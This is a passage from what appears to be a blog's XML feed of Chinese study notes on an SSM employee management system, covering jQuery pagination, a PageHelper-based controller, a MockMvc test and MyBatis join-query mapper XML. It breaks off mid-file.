prePageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //为元素添加点击翻页的事件</span></span><br><span class="line"><span class="xml">            firstPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            prePageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum-1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //构建元素</span></span><br><span class="line"><span class="xml">        var nextPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;raquo;"));</span></span><br><span class="line"><span class="xml">        var lastPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("末页").attr("href","#"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasNextPage == false)&#123;</span></span><br><span class="line"><span class="xml">            nextPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            lastPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //为元素添加点击翻页的事件</span></span><br><span class="line"><span class="xml">            nextPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum+1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            lastPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pages);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //添加首页和前一页的提示</span></span><br><span class="line"><span class="xml">        ul.append(firstPageLi).append(prePageLi);</span></span><br><span class="line"><span class="xml">        //1,2,3....遍历给ul中添加页码提示</span></span><br><span class="line"><span class="xml">        $.each(result.extend.pageInfo.navigatepageNums,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var numLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append(item));</span></span><br><span class="line"><span class="xml">            if(result.extend.pageInfo.pageNum == item)&#123;</span></span><br><span class="line"><span class="xml">                numLi.addClass("active");</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">            numLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(item);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            ul.append(numLi);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">        //添加后一页和末页的提示</span></span><br><span class="line"><span class="xml">        ul.append(nextPageLi).append(lastPageLi);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //把ul加入到nav元素中</span></span><br><span class="line"><span class="xml">        var navEle = $("<span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>").append(ul);</span></span><br><span class="line"><span class="xml">        navEle.appendTo("#page_nav_area");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //点击新增按钮弹出模态框</span></span><br><span class="line"><span class="xml">    $("#emp_add_modal_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //发送ajax请求，查出部门信息，显示在下拉列表</span></span><br><span class="line"><span class="xml">        getDepts();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //弹出模态框</span></span><br><span class="line"><span class="xml">        $("#empAddModal").modal(&#123;</span></span><br><span class="line"><span class="xml">            backdrop:"static"</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //查出所有的部门信息并显示在下拉列表中</span></span><br><span class="line"><span class="xml">    function getDepts() &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">           url:"$&#123;APP_PATH&#125;/depts",</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                // console.log(result)</span></span><br><span class="line"><span class="xml">                //显示部门信息在下拉列表中</span></span><br><span class="line"><span class="xml">                // $("#dept_add_select").append("")</span></span><br><span class="line"><span class="xml">                $.each(result.extend.depts,function () &#123;</span></span><br><span class="line"><span class="xml">                    var optionEle = $("<span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span>").append(this.deptName).attr("value",this.deptId);</span></span><br><span class="line"><span class="xml">                    optionEle.appendTo("#dept_add_select")</span></span><br><span class="line"><span class="xml">                &#125;);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>这样一个模态框的新建功能就做好了</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>SSM</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>SSM-2020/10/5-员工管理系统-1</title>
    <url>/2020/10/05/SSM-2020-10-5-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="功能一：查询员工数据"><a href="#功能一：查询员工数据" class="headerlink" title="功能一：查询员工数据"></a>功能一：查询员工数据</h1><ol>
<li><p>访问index.jsp页面</p>
</li>
<li><p>index.jsp页面发送出查询员工列表请求</p>
</li>
<li><p>EmployeeController来接受请求，查出员工数据</p>
</li>
<li><p>来到list.jsp页面进行展示</p>
</li>
</ol>
<ul>
<li>URI: /emps</li>
</ul>
<p>效果图：<br><img src="/img/JavaWeb/10-5学习日记/0.png" alt="avatar"></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>首先分析一下，这个页面一页有5条数据，规定了URI为/emps，可以分页查询到所有数据</p>
<p>那么首先就在index.jsp中编写<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:forward</span> <span class="attr">page</span>=<span class="string">"//emps"</span>&gt;</span><span class="tag">&lt;/<span class="name">jsp:forward</span>&gt;</span></span><br></pre></td></tr></table></figure><br>访问首页时就会转到/emps</p>
<p>跟随逻辑，index.jsp发送列表请求被Controller接受并查出员工数据</p>
<p>EmployeeController<br><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">package com.ceit.crud.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.Employee;</span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.service.EmployeeService;</span><br><span class="line"><span class="keyword">import</span> com.github.pagehelper.PageHelper;</span><br><span class="line"><span class="keyword">import</span> com.github.pagehelper.PageInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理员工CRUD请求</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">@<span class="type">Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmployeeController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    @<span class="type">Autowired</span></span><br><span class="line">    <span class="type">EmployeeService</span> employeeService;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询员工数据(分页查询)</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    @<span class="type">RequestMapping</span>(<span class="string">"/emps"</span>)</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> getEmps(@<span class="type">RequestParam</span>(value = <span class="string">"pn"</span>,defaultValue = <span class="string">"1"</span>)<span class="type">Integer</span> pn, <span class="type">Model</span> model)&#123;</span><br><span class="line">        <span class="comment">//这不是一个分页查询</span></span><br><span class="line">        <span class="comment">//引入PageHelper分页插件</span></span><br><span class="line">        <span class="comment">//在查询之前只需要调用,传入页码以及每页的个数</span></span><br><span class="line">        <span class="type">PageHelper</span>.startPage(pn,<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//startPage后面紧跟的这个查询就是一个分页查询</span></span><br><span class="line">        <span class="type">List</span>&lt;<span class="type">Employee</span>&gt; emps = employeeService.getAll();</span><br><span class="line">        <span class="comment">//使用PageInfo包装查询后的结果，只需要将PageInfo交给页面就行了</span></span><br><span class="line">        <span class="comment">//封装了详细的分页信息，包括有我们查询出来的数据,连续显示的页数</span></span><br><span class="line">        <span class="type">PageInfo</span> page= new <span class="type">PageInfo</span>(emps,<span class="number">5</span>);</span><br><span class="line">        model.addAttribute(<span class="string">"pageInfo"</span>,page);</span><br><span class="line">        page.getNavigatepageNums();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"list"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里使用了PageHelper分页插件来进行分页，具体百度就行</p>
<p>pn就是页码，默认值为1</p>
<p>先暂时不放在页面上，所以对其进行一下单元测试</p>
<p>在test包下新建一个MvcTest<br><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">package com.ceit.crud.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.Employee;</span><br><span class="line"><span class="keyword">import</span> com.github.pagehelper.PageInfo;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.mock.web.MockHttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.ContextConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringJUnit4ClassRunner;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.web.WebAppConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.web.servlet.MockMvc;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.web.servlet.MockMvcBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.web.servlet.MvcResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.web.servlet.request.MockMvcRequestBuilders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.web.servlet.setup.MockMvcBuilders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用Spring测试模块提供的测试请求功能，测试crud请求的正确性</span></span><br><span class="line"><span class="comment"> * Spring4测试的时候，需要servlet3的支持</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@<span class="type">RunWith</span>(<span class="type">SpringJUnit4ClassRunner</span><span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">@<span class="title">WebAppConfiguration</span></span></span><br><span class="line"><span class="class">@<span class="title">ContextConfiguration</span>(<span class="title">locations</span>=</span>&#123;<span class="string">"classpath:applicationContext.xml"</span>,<span class="string">"file:src/main/webapp/WEB-INF/dispatcherServlet-servlet.xml"</span>&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MVCTest</span> </span>&#123;</span><br><span class="line">    <span class="comment">//传入Springmvc的ioc</span></span><br><span class="line">    @<span class="type">Autowired</span></span><br><span class="line">    <span class="type">WebApplicationContext</span> context;</span><br><span class="line">    <span class="comment">//虚拟mvc请求，获取到处理结果</span></span><br><span class="line">    <span class="type">MockMvc</span> mockMvc;</span><br><span class="line"></span><br><span class="line">    @<span class="type">Before</span></span><br><span class="line">    <span class="keyword">public</span> void initMokcMvc()&#123;</span><br><span class="line">        mockMvc = <span class="type">MockMvcBuilders</span>.webAppContextSetup(context).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="type">Test</span></span><br><span class="line">    <span class="keyword">public</span> void testPage() <span class="keyword">throws</span> <span class="type">Exception</span> &#123;</span><br><span class="line">        <span class="comment">//模拟请求拿到返回值</span></span><br><span class="line">        <span class="type">MvcResult</span> result = mockMvc.perform(<span class="type">MockMvcRequestBuilders</span>.<span class="keyword">get</span>(<span class="string">"/emps"</span>).param(<span class="string">"pn"</span>, <span class="string">"5"</span>)).andReturn();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//请求成功以后，请求域中会有PageInfo,我们可以取出PageInfo进行验证</span></span><br><span class="line">        <span class="type">MockHttpServletRequest</span> request = result.getRequest();</span><br><span class="line">        <span class="type">PageInfo</span> pi = (<span class="type">PageInfo</span>) request.getAttribute(<span class="string">"pageInfo"</span>);</span><br><span class="line">        <span class="type">System</span>.out.<span class="built_in">println</span>(<span class="string">"当前页码："</span>+pi.getPageNum());</span><br><span class="line">        <span class="type">System</span>.out.<span class="built_in">println</span>(<span class="string">"总页码:"</span>+pi.getPages());</span><br><span class="line">        <span class="type">System</span>.out.<span class="built_in">println</span>(<span class="string">"总记录数"</span>+pi.getTotal());</span><br><span class="line">        <span class="type">System</span>.out.<span class="built_in">println</span>(<span class="string">"在页面需要连续显示的页码"</span>);</span><br><span class="line">        int[] nums = pi.getNavigatepageNums();</span><br><span class="line">        <span class="keyword">for</span>(int i:nums)&#123;</span><br><span class="line">            <span class="type">System</span>.out.<span class="built_in">print</span>(<span class="string">" "</span>+i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">System</span>.out.<span class="built_in">println</span>();</span><br><span class="line">        <span class="comment">//获取员工数据</span></span><br><span class="line">        <span class="type">List</span>&lt;<span class="type">Employee</span>&gt; list = pi.getList();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">Employee</span> employee : list)&#123;</span><br><span class="line">            <span class="type">System</span>.out.<span class="built_in">println</span>(<span class="string">"ID"</span>+employee.getEmpId()+<span class="string">"==&gt;Name"</span>+employee.getEmpName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里踩了个坑，要注意的是pom.xml中的c3p0可能会因为版本问题报错，修改成<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">type</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><br>重启加载依赖即可</p>
<p>运行结果<br><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">当前页码：5</span><br><span class="line"><span class="section">总页码:250</span></span><br><span class="line">总记录数1248</span><br><span class="line">在页面需要连续显示的页码</span><br><span class="line"> 3 4 5 6 7</span><br><span class="line">ID21==&gt;Namedffa319</span><br><span class="line">ID22==&gt;Name31b4020</span><br><span class="line">ID23==&gt;Name4fc7c21</span><br><span class="line">ID24==&gt;Name9b3c422</span><br><span class="line">ID25==&gt;Namef878c23</span><br></pre></td></tr></table></figure><br>这里看到当前页码，总页码，总记录数，需要连续显示的页码以及数据都已经能成功捕获到了，那么接下来只需要写页面进行展示即可</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>SSM</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>SSM-2020/9/21-Mybatis</title>
    <url>/2020/09/21/SSM-2020-9-21-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Mybatis运行"><a href="#Mybatis运行" class="headerlink" title="Mybatis运行"></a>Mybatis运行</h1><p>首先运行一下MyBatis生成一下mapper文件<br>建一个java文件<br>MBGTest.java<br><figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.crud.test;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.generator.api.MyBatisGenerator;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.generator.config.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.generator.config.xml.ConfigurationParser;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.generator.exception.InvalidConfigurationException;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.generator.exception.XMLParserException;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.generator.internal.DefaultShellCallback;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MBGTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> void main(<span class="keyword">String</span>[] args) throws IOException, XMLParserException, InvalidConfigurationException, SQLException, InterruptedException &#123;</span><br><span class="line">        List&lt;<span class="keyword">String</span>&gt; warnings = <span class="keyword">new</span> <span class="type">ArrayList</span>&lt;<span class="keyword">String</span>&gt;();</span><br><span class="line">        boolean overwrite = <span class="literal">true</span>;</span><br><span class="line">        File configFile = <span class="keyword">new</span> <span class="type">File</span>(<span class="string">"F:\\default\\SSM\\src\\main\\resources\\generatorConfig.xml"</span>);</span><br><span class="line">        ConfigurationParser cp = <span class="keyword">new</span> <span class="type">ConfigurationParser</span>(warnings);</span><br><span class="line">        Configuration config = cp.parseConfiguration(configFile);</span><br><span class="line">        DefaultShellCallback callback = <span class="keyword">new</span> <span class="type">DefaultShellCallback</span>(overwrite);</span><br><span class="line">        MyBatisGenerator myBatisGenerator = <span class="keyword">new</span> <span class="type">MyBatisGenerator</span>(config, callback, warnings);</span><br><span class="line">        myBatisGenerator.generate(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>注意要修改路径</p>
<p>运行之后，mapper和dao中就会出现两个文件</p>
<p>bean下也会出现相应的文件</p>
<h1 id="实现多表联合查询"><a href="#实现多表联合查询" class="headerlink" title="实现多表联合查询"></a>实现多表联合查询</h1><p>生成之后的文件以及查询方法，不太能满足我们的需要，所以需要进行一些更改，来满足通过部门信息就能查询出来，实现一个多表联合查询</p>
<p>在dao包下的EmployeeMapper.java中<br>添加上:<br><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">List&lt;Employee&gt; selectByExampleWithDept(<span class="name">EmployeeExample</span> example)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">Employee selectByPrimaryKeyWithDept(<span class="name">Integer</span> empId)<span class="comment">;</span></span><br></pre></td></tr></table></figure><br>并在bean包下的Emplotee.java员工信息中添加<br><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">private Department  department<span class="comment">;</span></span><br></pre></td></tr></table></figure><br>并加上getter和setter</p>
<p>在EmployeeMapper.xml 添加sql标签<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">&lt;sql id=<span class="string">"WithDept_Column_List"</span>&gt;</span><br><span class="line">  e<span class="selector-class">.emp_id</span>, e<span class="selector-class">.emp_name</span>, e<span class="selector-class">.gender</span>, e<span class="selector-class">.email</span>, e<span class="selector-class">.d_id</span>, d<span class="selector-class">.dept_id</span>, d.dept_name</span><br><span class="line">&lt;/sql&gt;</span><br></pre></td></tr></table></figure></p>
<p>接着添加查询方法<br><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">select</span> id=<span class="string">"selectByExampleWithDept"</span> &gt;</span><br><span class="line">		 <span class="keyword">select</span></span><br><span class="line">  &lt;<span class="keyword">if</span> test=<span class="string">"distinct"</span>&gt;</span><br><span class="line">    <span class="keyword">distinct</span></span><br><span class="line">  &lt;/<span class="keyword">if</span>&gt;</span><br><span class="line">  &lt;<span class="keyword">include</span> refid=<span class="string">"WithDept_Column_List"</span> /&gt;</span><br><span class="line">  <span class="keyword">from</span> tbl_emp <span class="built_in">e</span></span><br><span class="line">  <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> tbl_dept d <span class="keyword">ON</span> <span class="built_in">e</span>.<span class="symbol">`d_id`</span>=d.<span class="symbol">`dept_id`</span></span><br><span class="line">  &lt;<span class="keyword">if</span> test=<span class="string">"_parameter != null"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">include</span> refid=<span class="string">"Example_Where_Clause"</span> /&gt;</span><br><span class="line">  &lt;/<span class="keyword">if</span>&gt;</span><br><span class="line">  &lt;<span class="keyword">if</span> test=<span class="string">"orderByClause != null"</span>&gt;</span><br><span class="line">    <span class="keyword">order</span> <span class="keyword">by</span> $&#123;orderByClause&#125;</span><br><span class="line">  &lt;/<span class="keyword">if</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">select</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>在EmployeeMapper.xml下添加resultMap<br><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">&lt;resultMap <span class="built_in">id</span>=<span class="string">"WithDeptResultMap"</span> type=<span class="string">"com.ceit.crud.bean.Employee"</span>&gt;</span><br><span class="line">  &lt;<span class="built_in">id</span> column=<span class="string">"emp_id"</span> jdbcType=<span class="string">"INTEGER"</span> <span class="keyword">property</span>=<span class="string">"empId"</span> /&gt;</span><br><span class="line">  &lt;<span class="literal">result</span> column=<span class="string">"emp_name"</span> jdbcType=<span class="string">"VARCHAR"</span> <span class="keyword">property</span>=<span class="string">"empName"</span> /&gt;</span><br><span class="line">  &lt;<span class="literal">result</span> column=<span class="string">"gender"</span> jdbcType=<span class="string">"CHAR"</span> <span class="keyword">property</span>=<span class="string">"gender"</span> /&gt;</span><br><span class="line">  &lt;<span class="literal">result</span> column=<span class="string">"email"</span> jdbcType=<span class="string">"VARCHAR"</span> <span class="keyword">property</span>=<span class="string">"email"</span> /&gt;</span><br><span class="line">  &lt;<span class="literal">result</span> column=<span class="string">"d_id"</span> jdbcType=<span class="string">"INTEGER"</span> <span class="keyword">property</span>=<span class="string">"dId"</span> /&gt;</span><br><span class="line">  &lt;association <span class="keyword">property</span>=<span class="string">"department"</span> javaType=<span class="string">"com.ceit.crud.bean.Department"</span> &gt;</span><br><span class="line">      &lt;<span class="built_in">id</span> column=<span class="string">"dept_id"</span> <span class="keyword">property</span>=<span class="string">"deptId"</span> /&gt;</span><br><span class="line">      &lt;<span class="literal">result</span> column=<span class="string">"dept_name"</span> <span class="keyword">property</span>=<span class="string">"deptName"</span>/&gt;</span><br><span class="line">  &lt;/association&gt;</span><br><span class="line">&lt;/resultMap&gt;</span><br></pre></td></tr></table></figure></p>
<p>并修改selectByExampleWithDept为<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectByExampleWithDept"</span> <span class="attr">resultMap</span>=<span class="string">"WithDeptResultMap"</span>&gt;</span></span></span><br><span class="line"><span class="xml">  select</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"distinct"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    distinct</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"WithDept_Column_List"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">  from tbl_emp e</span></span><br><span class="line"><span class="xml">  LEFT JOIN tbl_dept d ON e.`d_id`=d.`dept_id`</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"_parameter != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Example_Where_Clause"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"orderByClause != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    order by $</span><span class="template-variable">&#123;orderByClause&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>部门的查询就完成了</p>
<p>接着同理写一个主键的sql标签<br><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">select</span> id=<span class="string">"selectByPrimaryKeyWithDept"</span> resultMap=<span class="string">"WithDeptResultMap"</span>&gt;</span><br><span class="line">  <span class="keyword">select</span></span><br><span class="line">  &lt;<span class="keyword">include</span> refid=<span class="string">"WithDept_Column_List"</span> /&gt;</span><br><span class="line">  <span class="keyword">from</span> tbl_emp <span class="built_in">e</span></span><br><span class="line">  <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> tbl_dept d <span class="keyword">ON</span> <span class="built_in">e</span>.<span class="symbol">`d_id`</span>=d.<span class="symbol">`dept_id`</span></span><br><span class="line">  <span class="keyword">where</span> emp_id = #&#123;empId,jdbcType=INTEGER&#125;</span><br><span class="line">&lt;/<span class="keyword">select</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>最终的EmployeeMapper.xml<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"com.ceit.crud.dao.EmployeeMapper"</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"BaseResultMap"</span> <span class="attr">type</span>=<span class="string">"com.ceit.crud.bean.Employee"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"emp_id"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"empId"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"emp_name"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span> <span class="attr">property</span>=<span class="string">"empName"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"gender"</span> <span class="attr">jdbcType</span>=<span class="string">"CHAR"</span> <span class="attr">property</span>=<span class="string">"gender"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"email"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span> <span class="attr">property</span>=<span 